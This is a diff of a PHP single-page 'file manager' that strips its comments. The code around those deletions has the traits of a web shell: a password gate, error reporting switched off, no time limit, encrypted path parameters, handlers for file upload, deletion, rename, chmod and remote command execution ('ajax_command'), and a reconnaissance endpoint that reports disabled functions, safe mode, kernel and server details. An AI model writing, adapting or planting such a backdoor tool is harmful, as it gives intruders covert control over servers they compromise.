@@ -1,7 +1,7 @@
 <?php declare(strict_types=1);
 
 const VERSION = '3.0.0';
-const THEME = 'dark'; // 'dark' or 'light'
+const THEME = 'dark';
 const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2';
 
 $alertMessages = [];
@@ -89,7 +89,6 @@ function renderFileTable(string $dir): string
 {
     ob_start();
 
-    // Sort: folders first, then files
     $items = array_diff(scandir($dir), ['.', '..']);
     $folders = $files = [];
     foreach ($items as $item)
@@ -98,7 +97,6 @@ function renderFileTable(string $dir): string
     sort($files);
     $sortedItems = array_merge($folders, $files);
 
-    // Reusable SVGs
     $svg = [
         'search' => '<svg class="h-5 w-5 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>',
         'back' => '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"/></svg>',
@@ -112,7 +110,6 @@ function renderFileTable(string $dir): string
         'chevron' => '<svg class="h-5 w-5 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/></svg>',
     ];
 
-    // Action button helper
     $actionBtn = function ($type, $path, $item, $isDir, $size = '4') use ($svg) {
         $enc = encryptPath($path);
         $json = htmlspecialchars(json_encode($item));
@@ -136,13 +133,11 @@ function renderFileTable(string $dir): string
 
     echo '<div class="file-list-container">';
 
-    // Search bar
     echo '<div class="mb-4"><div class="relative">';
     echo '<div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">' . $svg['search'] . '</div>';
     echo '<input type="text" id="fileSearch" class="w-full pl-10 pr-4 py-2 bg-surface-container border border-outline-variant rounded-lg focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant" placeholder="Search files and folders...">';
     echo '</div></div>';
 
-    // Desktop Table
     echo '<div class="hidden md:block w-full overflow-hidden rounded-xl shadow-sm border border-outline-variant">';
     echo '<table class="w-full border-collapse table-auto" id="desktopFileTable"><thead><tr class="bg-surface-container text-on-surface">';
     echo "<th class=\"$thClass\">Name</th><th class=\"$thClass w-24\">Size</th><th class=\"$thClass w-28\">Perms</th><th class=\"$thClass w-40\">Modified</th><th class=\"$thClass w-32\">Actions</th>";
@@ -177,7 +172,6 @@ function renderFileTable(string $dir): string
     }
     echo '</tbody></table></div>';
 
-    // Mobile View
     echo '<div class="md:hidden space-y-3" id="mobileFileList">';
     echo "<a href=\"?cd=$parentEnc\" class=\"flex items-center p-4 bg-surface rounded-xl shadow-sm border border-outline-variant hover:border-primary hover:shadow-md transition-all\">";
     echo '<div class="p-2 bg-surface-container rounded-lg mr-4"><svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"/></svg></div>';
@@ -210,7 +204,6 @@ function renderFileTable(string $dir): string
     }
     echo '</div>';
 
-    // Empty state
     echo '<div id="emptyState" class="hidden py-12 text-center">';
     echo '<div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-surface-container mb-4"><svg class="h-8 w-8 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.172 16.172a4 4 0 015.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>';
     echo '<h3 class="text-lg font-medium text-on-surface mb-1">No files found</h3><p class="text-on-surface-variant">Try adjusting your search</p></div>';
@@ -370,7 +363,6 @@ function newFile(string $dir): void
         $filename = $dir . DIRECTORY_SEPARATOR . $_POST['filename'];
         file_put_contents($filename, $_POST['content']);
 
-        // Reset POST data and show file manager
         $_POST = array();
         showAlert("File created successfully!", "success");
         fileManager($dir);
@@ -675,7 +667,6 @@ function renameFile(string $file): void
         $newname = $dirname . DIRECTORY_SEPARATOR . $_POST['newname'];
         rename($file, $newname);
 
-        // Reset POST data and show file manager
         $_POST = array();
         showAlert("File renamed successfully!", "success");
         fileManager($dirname);
@@ -755,7 +746,6 @@ function chmodFile(string $file): void
         $permission = octdec($_POST['permission']);
         chmod($file, $permission);
 
-        // Reset POST data and show file manager
         $_POST = array();
         showAlert("Permissions changed successfully!", "success");
         fileManager($dirname);
@@ -835,10 +825,8 @@ function deleteFile(string $file): bool
     $isDir = is_dir($file);
 
     if ($isDir) {
-        // For directories, try to remove recursively
         $success = deleteDirectory($file);
     } else {
-        // For files, simply unlink
         $success = @unlink($file);
     }
 
@@ -878,14 +866,12 @@ error_reporting(0);
 set_time_limit(0);
 ini_set('memory_limit', '256M');
 
-// Handle logout
 if (isset($_GET['logout'])) {
     session_destroy();
     header('Location: ?');
     exit;
 }
 
-// Handle AJAX delete request
 if (isset($_POST['ajax_delete'])) {
     if (authenticate()) {
         $file = decryptPath($_POST['path']);
@@ -911,7 +897,6 @@ if (isset($_POST['ajax_delete'])) {
     exit;
 }
 
-// Handle AJAX rename request
 if (isset($_POST['ajax_rename'])) {
     if (authenticate()) {
         $file = decryptPath($_POST['path']);
@@ -947,7 +932,6 @@ if (isset($_POST['ajax_rename'])) {
     exit;
 }
 
-// Handle AJAX chmod request
 if (isset($_POST['ajax_chmod'])) {
     if (authenticate()) {
         $file = decryptPath($_POST['path']);
@@ -981,7 +965,6 @@ if (isset($_POST['ajax_chmod'])) {
     exit;
 }
 
-// Handle AJAX new file request
 if (isset($_POST['ajax_newfile'])) {
     if (authenticate()) {
         $dir = decryptPath($_POST['path']);
@@ -1016,7 +999,6 @@ if (isset($_POST['ajax_newfile'])) {
     exit;
 }
 
-// Handle AJAX new folder request
 if (isset($_POST['ajax_newfolder'])) {
     if (authenticate()) {
         $dir = decryptPath($_POST['path']);
@@ -1050,7 +1032,6 @@ if (isset($_POST['ajax_newfolder'])) {
     exit;
 }
 
-// Handle AJAX command request
 if (isset($_POST['ajax_command'])) {
     if (authenticate()) {
         $dir = decryptPath($_POST['path']);
@@ -1083,7 +1064,6 @@ if (isset($_POST['ajax_command'])) {
     exit;
 }
 
-// Handle AJAX file upload
 if (isset($_POST['ajax_upload'])) {
     header('Content-Type: application/json');
 
@@ -1129,7 +1109,6 @@ if (isset($_POST['ajax_upload'])) {
     $filename = basename($_FILES['file']['name']);
     $targetPath = $targetDir . '/' . $filename;
 
-    // Rename if file exists
     if (file_exists($targetPath)) {
         $name = pathinfo($filename, PATHINFO_FILENAME);
         $ext = pathinfo($filename, PATHINFO_EXTENSION);
@@ -1151,7 +1130,6 @@ if (isset($_POST['ajax_upload'])) {
     exit;
 }
 
-// Handle AJAX info request
 if (isset($_POST['ajax_info'])) {
     header('Content-Type: application/json');
 
@@ -1166,7 +1144,6 @@ if (isset($_POST['ajax_info'])) {
     try {
         $info = [];
 
-        // PHP Info
         $safeMode = ini_get('safe_mode');
         $info['php'] = [
             'version' => PHP_VERSION,
@@ -1182,7 +1159,6 @@ if (isset($_POST['ajax_info'])) {
             'safe_mode' => $safeMode && $safeMode !== '' && $safeMode !== '0' ? 'On' : 'Off',
         ];
 
-        // Server Info
         $info['server'] = [
             'software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
             'name' => $_SERVER['SERVER_NAME'] ?? 'N/A',
@@ -1192,7 +1168,6 @@ if (isset($_POST['ajax_info'])) {
             'server_addr' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
         ];
 
-        // System Info
         $uname = @php_uname('a') ?: 'N/A';
         $kernelParts = explode(' ', $uname);
         $kernel = isset($kernelParts[2]) ? $kernelParts[2] : ($kernelParts[0] ?? 'N/A');
@@ -1208,7 +1183,6 @@ if (isset($_POST['ajax_info'])) {
             'temp_dir' => @sys_get_temp_dir() ?: 'N/A',
         ];
 
-        // Disk Info
         $diskTotal = @disk_total_space('/');
         $diskFree = @disk_free_space('/');
         $info['disk'] = [
@@ -1216,11 +1190,9 @@ if (isset($_POST['ajax_info'])) {
             'free' => $diskFree ? formatSize((int) $diskFree) : 'N/A',
         ];
 
-        // Database Extensions
         $dbExtensions = ['mysqli', 'pdo_mysql', 'pgsql', 'pdo_pgsql', 'sqlite3', 'pdo_sqlite', 'mongodb'];
         $info['databases'] = array_values(array_filter($dbExtensions, 'extension_loaded'));
 
-        // Disabled Functions
         $disabledFunctions = ini_get('disable_functions');
         $info['disabled_functions'] = $disabledFunctions ? array_map('trim', explode(',', $disabledFunctions)) : [];
 
@@ -1237,7 +1209,6 @@ if (isset($_POST['ajax_info'])) {
     exit;
 }
 
-// Handle download
 if (isset($_GET['download'])) {
     $file = decryptPath($_GET['download']);
     downloadFile($file);
@@ -1467,18 +1438,13 @@ $currentTime = date('Y-m-d H:i:s');
 </head>
 
 <body class="bg-background min-h-screen flex flex-col">
-    <!-- Alert Container -->
     <div id="alertContainer" class="alert-container"></div>
 
-    <!-- Unified Modal System -->
-    <!-- Generic Modal Template -->
     <div id="actionModal" class="modal">
         <div class="modal-content" id="modalContent">
-            <!-- Content will be dynamically inserted here -->
         </div>
     </div>
 
-    <!-- Header -->
     <header class="bg-surface-container-high text-on-surface shadow-lg sticky top-0 z-50">
         <div class="container mx-auto px-4 py-4">
             <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
@@ -1521,10 +1487,8 @@ $currentTime = date('Y-m-d H:i:s');
         </div>
     </header>
 
-    <!-- Main Content -->
     <div class="flex-grow">
         <div class="container mx-auto px-3 sm:px-4 py-4 sm:py-6">
-            <!-- Directory Navigator -->
             <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant p-4 sm:p-5 mb-4 sm:mb-6">
                 <div class="mb-4">
                     <h2
@@ -1596,7 +1560,6 @@ $currentTime = date('Y-m-d H:i:s');
                 </div>
             </div>
 
-            <!-- Main Content Area -->
             <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant p-4 sm:p-6">
                 <?php
                 if (isset($_GET['action'])) {
@@ -1622,7 +1585,6 @@ $currentTime = date('Y-m-d H:i:s');
         </div>
     </div>
 
-    <!-- Footer -->
     <footer class="bg-surface-container-highest text-on-surface-variant py-5 mt-auto">
         <div class="container mx-auto px-4">
             <div class="flex flex-col sm:flex-row justify-between items-center gap-3">
